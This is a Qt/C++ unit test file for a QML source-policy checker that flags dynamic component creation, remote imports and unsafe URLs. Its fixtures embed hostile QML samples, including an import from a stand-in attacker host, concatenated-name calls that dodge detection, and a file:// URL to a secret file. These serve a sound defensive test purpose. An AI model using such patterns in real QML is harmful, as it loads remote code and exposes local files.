#include "QmlSourcePolicy.h"

#include <QTest>

class QmlSourcePolicyTest final : public QObject
{
    Q_OBJECT

private slots:
    void rejectsDynamicConstructionLoadingAndImports();
    void ignoresCommentsStringsAndStaticComponents();
    void distinguishesRegexAndTemplateExpressions();
    void rejectsComputedLoaderMembersAndUnsafeUrls();
};

void QmlSourcePolicyTest::rejectsDynamicConstructionLoadingAndImports()
{
    const QByteArray source = R"QML(
import QtQuick
import "https://attacker.invalid/module"
Item {
  property var q: Qt
  property string target: "remote.qml"
  Loader { source: target }
  Loader { sourceComponent: safeComponent }
  function attack(loader, name) {
    q["create" + "Component"](target)
    Qt[name](target)
    Qt.createQmlObject(target, loader)
    Qt.include(target)
    loader.setSource(target)
    import(target)
  }
}
)QML";
    const QStringList violations = QmlSourcePolicy::violations(source);
    QVERIFY(violations.contains(QStringLiteral("remote-import")));
    QVERIFY(violations.contains(QStringLiteral("qml-create-component")));
    QVERIFY(violations.contains(QStringLiteral("qt-dynamic-member")));
    QVERIFY(violations.contains(QStringLiteral("qml-create-object")));
    QVERIFY(violations.contains(QStringLiteral("qt-include")));
    QVERIFY(violations.contains(QStringLiteral("dynamic-loader-source")));
    QVERIFY(violations.contains(QStringLiteral("loader-set-source")));
    QVERIFY(violations.contains(QStringLiteral("dynamic-import")));
}

void QmlSourcePolicyTest::ignoresCommentsStringsAndStaticComponents()
{
    const QByteArray source = R"QML(
import QtQuick
Item {
  // Qt.createComponent("ignored.qml")
  property string documentation: "Qt.createQmlObject and loader.setSource and import(x)"
  property Component safeComponent: Component { Item {} }
  Loader { sourceComponent: safeComponent }
}
)QML";
    QCOMPARE(QmlSourcePolicy::violations(source), QStringList{});
}

void QmlSourcePolicyTest::distinguishesRegexAndTemplateExpressions()
{
    const QByteArray safe = R"QML(
import QtQuick
Item {
  property var detector: /Qt\.createComponent\("remote.qml"\)/gi
  property string documentation: `Qt.createQmlObject and loader.setSource`
  function divide(a, b) { return a / b / 2 }
}
)QML";
    QCOMPARE(QmlSourcePolicy::violations(safe), QStringList{});

    const QByteArray attack = R"QML(
import QtQuick
Item {
  property var q: Qt
  property string computed: `${q["create" + "Component"]("remote.qml")}`
}
)QML";
    const QStringList violations = QmlSourcePolicy::violations(attack);
    QVERIFY(violations.contains(QStringLiteral("qt-dynamic-member")));
    QVERIFY(violations.contains(QStringLiteral("qml-create-component")));
}

void QmlSourcePolicyTest::rejectsComputedLoaderMembersAndUnsafeUrls()
{
    const QByteArray source = R"QML(
import QtQuick
Item {
  property var loaderAlias
  Image { source: "file:///C:/secret.txt" }
  Image { source: "https://attacker.invalid/pixel.png" }
  Image { source: model.dynamicPath }
  function attack(loader, member) {
    const alias = loader
    loader["set" + "Source"]("remote.qml")
    loader[member]("remote.qml")
    alias[member]
  }
}
)QML";
    const QStringList violations = QmlSourcePolicy::violations(source);
    QVERIFY(violations.contains(QStringLiteral("loader-set-source")));
    QVERIFY(violations.contains(QStringLiteral("loader-dynamic-member")));
    QVERIFY(violations.contains(QStringLiteral("unsafe-url-source")));
    QVERIFY(violations.contains(QStringLiteral("dynamic-url-source")));

    const QByteArray safe = R"QML(
import QtQuick
Item {
  Image { source: "assets/logo.png" }
  Image { source: "qrc:/icons/logo.png" }
  Loader { sourceComponent: Component { Image { source: "assets/nested.png" } } }
}
)QML";
    QCOMPARE(QmlSourcePolicy::violations(safe), QStringList{});
}

QTEST_MAIN(QmlSourcePolicyTest)
#include "tst_qml_source_policy.moc"
